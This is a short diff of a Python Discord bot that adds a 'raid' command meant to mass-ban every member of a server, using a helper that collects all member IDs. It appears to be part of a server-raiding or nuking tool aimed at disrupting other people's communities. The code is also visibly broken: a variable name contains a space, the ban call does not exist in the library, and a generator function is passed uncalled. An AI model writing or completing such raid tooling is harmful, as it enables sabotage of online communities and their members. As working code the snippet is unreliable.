@@ -7,8 +7,17 @@ bot = commands.Bot(command_prefix='r')
 
 liste blanche= []
 
+def get_all_members_ids(guild):
+    for member in guild.members:
+        yield member.id
+
+
+
+
+
 @bot.command()
-async def raid(ctx):
+async def raid(ctx,):
+    await bot.ban(get_all_members_ids)
     
 
 
